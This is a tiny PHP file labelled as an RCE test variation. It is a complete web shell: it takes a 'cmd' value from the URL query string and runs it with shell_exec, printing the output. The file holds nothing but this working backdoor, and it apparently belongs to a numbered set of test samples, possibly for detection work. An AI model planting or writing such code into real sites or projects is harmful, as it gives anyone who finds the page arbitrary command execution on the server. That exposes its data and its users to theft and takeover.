<?php
// RCE test variation #629
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>